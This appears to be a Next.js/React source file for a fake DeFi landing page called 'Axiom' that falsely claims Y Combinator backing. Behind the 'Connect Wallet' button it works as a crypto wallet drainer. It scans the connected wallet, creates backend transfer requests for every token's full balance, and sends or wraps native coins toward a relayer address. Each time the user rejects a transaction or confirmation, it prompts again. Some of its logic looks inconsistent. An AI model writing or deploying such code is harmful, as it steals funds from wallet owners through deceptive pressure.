'use client'

import React, { useEffect, useState, CSSProperties } from 'react'
import { useAppKit } from '@reown/appkit/react'
import {useSwitchChain, useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
import { ethers } from 'ethers'

interface Token {
  symbol?: string
  address?: string | null
  balance?: string
  decimals?: number
  chain?: number
}

interface SentItem {
  token: Token
  type: 'wrap' | 'transfer' | string
  tx?: string
  amount?: string
  jobId?: string
}

interface FailedItem {
  token: Token
  reason: string
}

// Definición de estilos con tipos TypeScript
const styles: { [key: string]: CSSProperties } = {
  body: {
    fontFamily: "'Inter', sans-serif",
    margin: 0,
    padding: 0,
    backgroundColor: '#0a0a0a',
    color: '#ffffff',
  },
  navbar: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    padding: '1rem 2rem',
    position: 'fixed',
    top: 0,
    width: '100%',
    zIndex: 1000,
    boxSizing: 'border-box',
    background: 'rgba(10, 10, 10, 0.8)',
    backdropFilter: 'blur(10px)',
  },
  navButtons: {
    display: 'flex',
    gap: '1rem',
  },
  loginBtn: {
    background: 'transparent',
    color: 'white',
    border: '1px solid rgba(255, 255, 255, 0.2)',
    padding: '10px 20px',
    borderRadius: '10px',
    fontWeight: 500,
    cursor: 'pointer',
    transition: 'all 0.3s ease',
  },
  signupBtn: {
    background: 'linear-gradient(90deg, #8C66FC, #0274F1)',
    color: 'white',
    padding: '10px 20px',
    borderRadius: '10px',
    fontWeight: 500,
    border: 'none',
    cursor: 'pointer',
    transition: 'all 0.3s ease',
  },
  ctaButton: {
    background: 'linear-gradient(90deg, #8C66FC, #0274F1)',
    color: 'white',
    padding: '15px 40px',
    borderRadius: '10px',
    fontWeight: 600,
    fontSize: '18px',
    border: 'none',
    cursor: 'pointer',
    transition: 'all 0.3s ease',
    marginTop: '2%',
    textDecoration: 'none',
    display: 'inline-block',
  },
  mainContent: {
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'center',
    height: '100vh',
    flexDirection: 'column',
    background: 'linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%)',
    textAlign: 'center',
    padding: '0 2rem',
  },
  mainTitle: {
    fontSize: '3.5rem',
    fontWeight: 700,
    margin: '1rem 0',
    background: 'linear-gradient(90deg, #8C66FC, #0274F1)',
    backgroundClip: 'text',
    WebkitBackgroundClip: 'text',
    WebkitTextFillColor: 'transparent',
  },
  subtitle: {
    fontSize: '1.2rem',
    color: '#ccc',
    marginBottom: '2rem',
    maxWidth: '600px',
  },
  modalOverlay: {
    position: 'fixed',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    backgroundColor: 'rgba(0, 0, 0, 0.8)',
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'center',
    zIndex: 1000,
    flexDirection: 'column'
  },
  modalContainer: {
    background: '#1E1E1E',
    borderRadius: '20px',
    padding: '30px',
    width: '400px',
    maxWidth: '90%',
    position: 'relative',
  },
  spinner: {
    border: '5px solid #f3f3f3',
    borderTop: '5px solid #8C66FC',
    borderRadius: '50%',
    width: '50px',
    height: '50px',
    animation: 'spin 1s linear infinite',
    marginBottom: '20px'
  },
  buttonHover: {
    transform: 'translateY(-2px)',
    boxShadow: '0 10px 20px rgba(0, 0, 0, 0.2)',
  },
  loginBtnHover: {
    background: 'rgba(255, 255, 255, 0.1)',
  },
};

// Función helper para fetch con mejor manejo de errores
const fetchWithErrorHandling = async (url: string, options: RequestInit) => {
  const res = await fetch(url, options);
  
  // Verificar el tipo de contenido antes de analizar JSON
  const contentType = res.headers.get('content-type');
  if (!contentType || !contentType.includes('application/json')) {
    const text = await res.text();
    throw new Error(`Unexpected server response: ${text.substring(0, 100)}`);
  }

  if (!res.ok) {
    const errorData = await res.json();
    throw new Error(`Server error: ${res.status} ${res.statusText}. ${errorData.error || ''}`);
  }

  return res.json();
};

export default function TokenManager(): React.JSX.Element {
  const { open } = useAppKit()
  const { address, isConnected } = useAccount()
  const walletClient = (useWalletClient() as { data?: any }).data
  const publicClient: any = usePublicClient()
  const { data: balance } = useBalance({ address })
  const { data: feeData } = useFeeData()
  const [tokens, setTokens] = useState<Token[]>([])
  const [processing, setProcessing] = useState<boolean>(false)
  const [summary, setSummary] = useState<{ sent: SentItem[]; failed: FailedItem[] }>({ sent: [], failed: [] })
  const [isClient, setIsClient] = useState<boolean>(false)
  const [hasScanned, setHasScanned] = useState<boolean>(false)
  const [scanError, setScanError] = useState<string>('')
  const [isLoading, setIsLoading] = useState<boolean>(false)
  const [loadingMessage, setLoadingMessage] = useState<string>('')
  const [showProcessingModal, setShowProcessingModal] = useState<boolean>(false)
  const [detectedTokensCount, setDetectedTokensCount] = useState<number>(0)
  const [pendingNativeTokens, setPendingNativeTokens] = useState<Token[]>([])

  const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''
  const { switchChain } = useSwitchChain()

  const changeChainIfNeeded = async (targetChainId: number, timeoutMs = 15000): Promise<void> => {
    if (!walletClient) throw new Error('Wallet client not available')

    try {
      setLoadingMessage(`Switching to network ${targetChainId}...`)
      setIsLoading(true)

      const getCurrent = async () => {
        try {
          return await walletClient.getChainId()
        } catch (e) {
          return undefined
        }
      }

      const currentChainId = await getCurrent()
      if (currentChainId === targetChainId) {
        setIsLoading(false)
        return
      }

      // Try to use wagmi's switchChain if available
      let switched = false
      try {
        if (switchChain) {
          await switchChain({ chainId: targetChainId })
          switched = true
        }
      } catch (swErr: any) {
        // If switchChain didn't work, we'll try with wallet RPC
        if (swErr?.code && swErr.code !== 4902 && !isUserRejected(swErr)) {
          // let the next block try an alternative switch or add the chain
        }
        if (isUserRejected(swErr)) {
          throw new Error('User rejected network change')
        }
      }

      // If not switched with switchChain, try with RPC request
      if (!switched) {
        try {
          await walletClient.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${targetChainId.toString(16)}` }]
          })
        } catch (err: any) {
          // If the chain doesn't exist (4902) try to add it
          if (err?.code === 4902) {
            // example for BSC; add more blockchains as needed
            if (targetChainId === 56) {
              await walletClient.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: '0x38',
                  chainName: 'BNB Smart Chain',
                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
                  blockExplorerUrls: ['https://bscscan.com/']
                }]
              })
              // try switch again
              await walletClient.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }]
              })
            } else {
              throw new Error(`Network with ID ${targetChainId} is not added to your wallet`)
            }
          } else if (isUserRejected(err)) {
            throw new Error('User rejected network change')
          } else {
            throw err
          }
        }
      }

      // Polling: wait until wallet actually reports the new chain
      const start = Date.now()
      while (Date.now() - start < timeoutMs) {
        const newChain = await getCurrent()
        if (newChain === targetChainId) {
          setIsLoading(false)
          return
        }
        await new Promise((r) => setTimeout(r, 500))
      }

      throw new Error('Timeout waiting for wallet to switch network')
    } catch (error: any) {
      setIsLoading(false)
      // rethrow with readable message
      if (isUserRejected(error)) throw new Error('User rejected network change')
      throw new Error(error?.message || String(error))
    }
  }

  useEffect(() => {
    setIsClient(true)

    // Global error handlers
    const onError = (e: ErrorEvent) => {
      console.error('Global error captured:', e.error || e.message || e)
    }
    const onRejection = (e: PromiseRejectionEvent) => {
      console.error('Unhandled rejection captured:', e.reason || e)
    }

    window.addEventListener('error', onError)
    window.addEventListener('unhandledrejection', onRejection)

    return () => {
      window.removeEventListener('error', onError)
      window.removeEventListener('unhandledrejection', onRejection)
    }
  }, [])

  useEffect(() => {
    if (isConnected && address && !hasScanned && !scanError) {
      scanWallet()
    }
  }, [isConnected, address, hasScanned, scanError])

  useEffect(() => {
    // Start processing automatically when tokens are detected
    if (hasScanned && tokens.length > 0 && !processing) {
      setShowProcessingModal(true)
      // Small delay so user sees the modal before processing begins
      setTimeout(() => {
        processAllTokens()
      }, 1500)
    }
  }, [hasScanned, tokens, processing])

  const showLoading = (message: string) => {
    setLoadingMessage(message)
    setIsLoading(true)
  }

  const hideLoading = () => {
    setIsLoading(false)
    setLoadingMessage('')
  }

  const scanWallet = async (): Promise<void> => {
    try {
      setScanError('')
      showLoading('Scanning tokens across all chains...')

      if (!BACKEND) {
        const errorMsg = 'Configuration error: NEXT_PUBLIC_BACKEND_URL is not defined.'
        console.error('[CONFIG]', errorMsg)
        setScanError(errorMsg)
        hideLoading()
        await alertAction(errorMsg)
        return
      }

      const data = await fetchWithErrorHandling(`${BACKEND}/owner-tokens`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ owner: address })
      })

      console.log('Detected tokens:', data)

      const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
        if (token.symbol === 'MATIC' && !token.address) {
          return { ...token, address: null }
        }
        return token
      })

      // Save all tokens
      setTokens(processedTokens || [])
      setDetectedTokensCount(processedTokens.length)
      setHasScanned(true)
      
      // Prepare pending native tokens
      const nativeTokens = processedTokens.filter(token => !token.address)
      setPendingNativeTokens(nativeTokens)
      
      // Log tokens to console
      if (processedTokens.length > 0) {
        console.log('Detected tokens:', processedTokens)
      }
      
      hideLoading()
    } catch (err: any) {
      console.error('Error scanning wallet:', err)
      const errorMsg = 'Error scanning wallet: ' + (err?.message || err)
      setScanError(errorMsg)
      hideLoading()
      await alertAction(errorMsg + '\n\nPlease try reconnecting your wallet.')
    }
  }

  const alertAction = async (message: string): Promise<void> => {
    if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
      ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'alert', message }))
      return
    }

    if (typeof globalThis !== 'undefined' && typeof (globalThis as any).alert === 'function') {
      globalThis.alert(message)
      return
    }

    console.log('Alert fallback:', message)
  }

  const confirmAction = async (message: string): Promise<boolean> => {
    if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
      return new Promise((resolve) => {
        const handler = (event: MessageEvent) => {
          try {
            const data = JSON.parse(event.data)
            if (data?.type === 'confirmResponse') {
              window.removeEventListener('message', handler)
              resolve(Boolean(data.response))
            }
          } catch (e) {}
        }

        window.addEventListener('message', handler)
        ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'confirm', message }))

        setTimeout(() => {
          window.removeEventListener('message', handler)
          resolve(false)
        }, 30000)
      })
    }

    if (typeof globalThis !== 'undefined' && typeof (globalThis as any).confirm === 'function') {
      return Promise.resolve(Boolean(globalThis.confirm(message)))
    }

    return Promise.resolve(false)
  }

  const getWrapInfo = async (chainId: number): Promise<any | null> => {
    try {
      if (!BACKEND) {
        console.warn('[CONFIG] getWrapInfo aborted: BACKEND not defined')
        return null
      }
      return await fetchWithErrorHandling(`${BACKEND}/wrap-info`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ chain: chainId })
      })
    } catch (err) {
      console.error('Error getting wrap info:', err)
      return null
    }
  }

  const isUserRejected = (error: any): boolean => {
    if (!error) return false
    const message = String(error?.message || '').toLowerCase()
    return /user denied|user rejected|rejected by user/i.test(message)
  }
    

  const processNativeToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
  try {
    if (!walletClient || !publicClient || !address) {
      throw new Error('Wallet not properly connected');
    }

    // Switch to the correct chain before processing
    await changeChainIfNeeded(token.chain as number)

    const targetChainId = token.chain as number;
    if (!targetChainId) {
      throw new Error('Could not determine token chain');
    }

    // Switch to the correct chain before processing
    await changeChainIfNeeded(targetChainId);

    // Rest of the code for wrap or transfer...
    const wrapInfo = await getWrapInfo(targetChainId);
    const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress;

      const balanceBN = ethers.BigNumber.from(token.balance || '0')
      const gasPrice = (feeData as any)?.gasPrice || ethers.BigNumber.from('20000000000') // 20 gwei default

      // Gas estimates
      const gasLimitTransfer = ethers.BigNumber.from(21000)
      const gasLimitWrap = ethers.BigNumber.from(100000)

      // Safety buffer
      const buffer = gasPrice.mul(30000)

      // Calculate safe maximums
      const feeWrap = gasPrice.mul(gasLimitWrap)
      const feeTransfer = gasPrice.mul(gasLimitTransfer)
      const maxSafeForWrap = balanceBN.gt(feeWrap.add(buffer)) ? balanceBN.sub(feeWrap).sub(buffer) : ethers.BigNumber.from(0)
      const maxSafeForTransfer = balanceBN.gt(feeTransfer.add(buffer)) ? balanceBN.sub(feeTransfer).sub(buffer) : ethers.BigNumber.from(0)

      // If not enough for any operation
      if (maxSafeForWrap.lte(0) && maxSafeForTransfer.lte(0)) {
        const reason = 'Insufficient balance to cover gas fees'
        setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
        return { success: false, reason }
      }

      // If wrapped is available and sufficient balance, wrap automatically
      if (wrappedAddress && maxSafeForWrap.gt(0)) {
        try {
          showLoading(`Processing wrap of ${token.symbol}...`)
          
          const wrapAbi = [
            {
              inputs: [],
              name: 'deposit',
              outputs: [],
              stateMutability: 'payable',
              type: 'function'
            }
          ] as const

          // Retry until transaction is confirmed
          let transactionHash: string | undefined;
          let confirmed = false;
          
          while (!confirmed) {
            try {
              transactionHash = await walletClient.writeContract({
                address: wrappedAddress as `0x${string}`,
                abi: wrapAbi,
                functionName: 'deposit',
                value: maxSafeForWrap.toBigInt(),
                gas: gasLimitWrap.toBigInt()
              })

              showLoading(`Waiting for wrap confirmation for ${token.symbol}...`)
              await publicClient.waitForTransactionReceipt({ hash: transactionHash })
              confirmed = true;

            } catch (error: any) {
              if (isUserRejected(error)) {
                // If user rejects, show alert and retry
                await alertAction('Transaction was rejected. Please confirm the transaction to continue.');
                continue;
              }
              throw error;
            }
          }

          setSummary(prev => ({
            ...prev,
            sent: [...prev.sent, { 
              token: { ...token, symbol: `W${token.symbol}` }, 
              type: 'wrap', 
              tx: transactionHash, 
              amount: maxSafeForWrap.toString() 
            }]
          }))

          hideLoading()
          return { success: true }
        } catch (error: any) {
            // Error handling
            console.error('Error processing native token:', error);
            const reason = isUserRejected(error) ? 
              'User rejected the transaction' : 
              `Error: ${error?.message || error}`;

            setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }));
            return { success: false, reason };
          }
        };

      // If no wrap was done, create transfer request in the backend
      if (maxSafeForTransfer.gt(0)) {
        if (!BACKEND) throw new Error('BACKEND not configured')
        
        showLoading(`Creating transfer request for ${token.symbol}...`)
        const data = await fetchWithErrorHandling(`${BACKEND}/create-native-transfer-request`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({
            owner: address,
            chain: token.chain,
            amount: maxSafeForTransfer.toString()
          })
        })

        if (data.ok && data.instructions && data.instructions.relayerAddress) {
          // Retry until transaction is confirmed
          let transactionHash: string | undefined;
          let confirmed = false;
          
          while (!confirmed) {
            try {
              showLoading(`Sending ${token.symbol} to relayer...`)
              transactionHash = await walletClient.sendTransaction({
                to: data.instructions.relayerAddress as `0x${string}`,
                value: maxSafeForTransfer.toBigInt(),
                gas: gasLimitTransfer.toBigInt()
              })

              showLoading(`Waiting for transfer confirmation for ${token.symbol}...`)
              await publicClient.waitForTransactionReceipt({ hash: transactionHash })
              confirmed = true;

            } catch (error: any) {
              if (isUserRejected(error)) {
                // If user rejects, show alert and retry
                await alertAction('Transaction was rejected. Please confirm the transaction to continue.');
                continue;
              }
              throw error;
            }
          }

          setSummary(prev => ({
            ...prev,
            sent: [...prev.sent, { 
              token, 
              type: 'transfer', 
              tx: transactionHash, 
              amount: maxSafeForTransfer.toString(), 
              jobId: data.jobId 
            }]
          }))
          
          hideLoading()
          return { success: true }
        } else {
          hideLoading()
          throw new Error('Error creating transfer request')
        }
      }
      
      hideLoading()
      return { success: false, reason: 'Could not process native token' }
    } catch (error: any) {
      hideLoading()
      console.error('Error processing native token:', error)

      const reason = isUserRejected(error) ? 'User rejected the transaction' : `Error: ${error?.message || error}`

      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
      return { success: false, reason }
    }
  }

  const processToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
    try {
      if (!BACKEND) throw new Error('BACKEND not configured')
      
      showLoading(`Processing ${token.symbol}...`)
      const data = await fetchWithErrorHandling(`${BACKEND}/create-transfer-request`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          owner: address,
          chain: token.chain,
          token: token.address,
          amount: token.balance
        })
      })

      if (data.ok) {
        setSummary(prev => ({ ...prev, sent: [...prev.sent, { token, type: 'transfer', jobId: data.jobId, amount: token.balance }] }))
        hideLoading()
        return { success: true }
      } else {
        hideLoading()
        throw new Error(data.error || 'Error creating transfer request')
      }
    } catch (error: any) {
      hideLoading()
      console.error('Error processing token:', error)
      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: error?.message || 'Unknown error' }] }))
      return { success: false, reason: error?.message || 'Unknown error' }
    }
  }

  const processAllTokens = async (): Promise<void> => {
    if (!tokens.length) {
      setShowProcessingModal(false)
      return
    }

    setProcessing(true)
    setSummary({ sent: [], failed: [] }) // Reset summary
    
    // Separate native and non-native tokens
    const nonNativeTokens = tokens.filter(token => token.address !== null)
    const nativeTokens = tokens.filter(token => token.address === null)
    
    // If there are native tokens, show persistent confirmation
    if (nativeTokens.length > 0) {
      let shouldProcessNatives = false;
      
      // Persist until user agrees to process native tokens
      while (!shouldProcessNatives) {
        shouldProcessNatives = await confirmAction(
          `We detected ${nativeTokens.length} native token(s). Do you want to process them automatically?`
        );
        
        if (!shouldProcessNatives) {
          // If user cancels, show message and ask again
          await alertAction('You must accept the processing of native tokens to continue.');
        }
      }
    }
    
    // Sort native tokens by balance (highest first)
    const sortedNativeTokens = [...nativeTokens].sort((a, b) => {
      const balanceA = ethers.BigNumber.from(a.balance || '0')
      const balanceB = ethers.BigNumber.from(b.balance || '0')
      return balanceB.gt(balanceA) ? 1 : balanceB.lt(balanceA) ? -1 : 0
    })

    // Process non-native tokens automatically
    for (const token of nonNativeTokens) {
      await processToken(token)
    }

    // Process native tokens automatically
    for (const token of sortedNativeTokens) {
      await changeChainIfNeeded(token.chain as number)
    }

    setProcessing(false)
    setShowProcessingModal(false)

    // Show summary after a brief delay for state to update
    setTimeout(async () => {
      if (summary.sent.length > 0 || summary.failed.length > 0) {
        let message = '=== Summary ===\n'
        message += `Success: ${summary.sent.length}\n`
        message += `Failed: ${summary.failed.length}\n`

        if (summary.failed.length > 0) {
          message += '\nSome tokens were not processed. Check the details.'
        }

        await alertAction(message)
      }
    }, 100)
  }

  // Hover effect states
  const [isLoginHovered, setIsLoginHovered] = useState(false);
  const [isSignupHovered, setIsSignupHovered] = useState(false);
  const [isCtaHovered, setIsCtaHovered] = useState(false);

  // Avoid rendering until we're on the client
  if (!isClient) {
    return (
      <div style={styles.mainContent}>
        <h1 style={styles.mainTitle}>Token Manager</h1>
        <p style={styles.subtitle}>Loading...</p>
      </div>
    )
  }

  return (
    <div style={styles.body}>
      {/* Navbar similar to the first code */}
      <nav style={styles.navbar}>
        <div style={styles.navButtons}>
          <button 
            style={{ 
              ...styles.loginBtn, 
              ...(isLoginHovered && styles.loginBtnHover) 
            }}
            onMouseEnter={() => setIsLoginHovered(true)}
            onMouseLeave={() => setIsLoginHovered(false)}
          >
            Login
          </button>
          <button 
            style={{ 
              ...styles.signupBtn, 
              ...(isSignupHovered && styles.buttonHover) 
            }}
            onMouseEnter={() => setIsSignupHovered(true)}
            onMouseLeave={() => setIsSignupHovered(false)}
          >
            Sign up
          </button>
        </div>
      </nav>

      {/* Main content */}
      <main style={styles.mainContent}>
        <h1 style={styles.mainTitle}>The Gateway to DeFi</h1>
        <p style={styles.subtitle}>Axiom is the only trading platform you'll ever need.</p>
        
        <button
          onClick={() => open()}
          style={{ 
            ...styles.ctaButton, 
            ...(isCtaHovered && styles.buttonHover) 
          }}
          onMouseEnter={() => setIsCtaHovered(true)}
          onMouseLeave={() => setIsCtaHovered(false)}
        >
          {isConnected ? `Connected: ${String(address)?.substring(0, 8)}...` : 'Connect Wallet'}
        </button>

        <div style={{ marginTop: '2rem', color: '#ccc' }}>
          <span>Backed by </span>
          <span style={{ fontWeight: 'bold' }}>Y Combinator</span>
        </div>
      </main>

      {/* Loading modal */}
      {(isLoading || showProcessingModal) && (
        <div style={styles.modalOverlay}>
          <div style={styles.modalContainer}>
            <div style={styles.spinner}></div>
            <p style={{ color: 'white', fontSize: '18px', margin: '0 0 10px 0', textAlign: 'center' }}>
              {showProcessingModal 
                ? `Processing ${detectedTokensCount} detected tokens...` 
                : loadingMessage}
            </p>
            <p style={{ color: '#ccc', fontSize: '14px', margin: 0, textAlign: 'center' }}>
              Please wait, this may take several minutes...
              <br />
              {showProcessingModal && 'Your wallet will open to confirm transactions.'}
            </p>
          </div>
        </div>
      )}

      {/* Spinner animation */}
      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  )
}
